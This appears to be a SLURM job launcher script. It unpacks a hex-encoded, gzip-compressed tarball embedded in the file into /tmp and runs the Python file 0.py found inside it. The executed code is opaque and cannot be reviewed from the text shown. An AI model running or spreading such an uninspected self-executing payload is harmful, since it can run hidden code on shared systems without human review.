#!/bin/bash
set -euo pipefail
exec /usr/bin/python3 -I -s -B - <<'A'
import hashlib,io,json,os,sys,tarfile
from pathlib import Path,PurePosixPath
j=os.environ.get('SLURM_JOB_ID','')
if not j.isdigit():raise ValueError('Allocation required')
b=bytes.fromhex('1f8b0800000000000003ed954d8fdb201086f7ec5f8172c1962282bfedac72ecbd87b6976ab5c2f690904d6c0b4877d3aaffbd6047abb4957adbdd569de700c666de81190673b637437ff3a27047c1f9d4f3df7b9ea6f9f3f3fcbe284b7e43f8cb2e6be664acd0cee56bf8fa0bf9b6b0c303f48b3559343c86b62a452193ba592cc96214e7c320ba7bb313495ef8295025a24d933a97c0055469db1489e495706d91f2b8ecda3c978dec649554491c774dccf3326f9aac9600a22eae559bb305e344f3a44e8a22f65f0ea2bf72167710d74d5574552c9346d6226f923c4b4a0e459cd505647997e55955a7125cd3364d97267999d6b2ccca226babc5f7b70eee3f0067e3f9c57dfcb9fee338ce7eadff2c4bb1fe5f03751c076d89399ba5ff112c77c2ec0eaa59baa048758040eae1484661fd4b7299fcde0d03bdf15de80c99d0db2f9fe3bbe8b6dd780de6cbdb84a15e513efd5d68c434b88ab7f064c3280ac46c4a57a31ef6d0da553b1c8fa75ed9f36abf3fc3a9dfd268d57ea6d3cd44efbc8cdd7ea58130069cfbcb12d97c538462169fae13a7ce76f0d4a92d18e76ab3712a3fdf62f42e785476472efb63c3087d2822220cb1eb80c8411320aa9f064449d20f9600ebc511983f28d678eb900ebadd09ddddef62bea2d1ba1d7aabfa135cdb28e31d841171929431ea55a77dcf72111bbddc5a0b65807c128713bcd37ad021fdd81b21fd22c693a591931c372e94235dcd86b7a3b784deb2e343a774380fcce6833ec1129e94b1f7c3c3348adcd447ad2c5c8263994b8016ad9d160673567c427c127d8e99ea7d8443be3456879353f7753a02571b66fbe1f9281c85ea03df843a0adefa2c23088220088220088220088220088220088220088220c8ffca0f12bbba1100280000')
r=Path('/tmp')/('a'+j+'b01ec87a6f29b')
r.mkdir(mode=0o700)
with tarfile.open(fileobj=io.BytesIO(b)) as a:
    for e in a:
        n=PurePosixPath(e.name)
        if n.is_absolute() or '..' in n.parts or not e.isfile():raise ValueError('Unsafe input')
        p=r/e.name;p.parent.mkdir(parents=True,exist_ok=True)
        with a.extractfile(e) as i,p.open('xb') as o:o.write(i.read())
os.chdir(r)
os.execv(sys.executable,[sys.executable,'-I','-s','-B',str(r/'0.py'),str(r)])
A
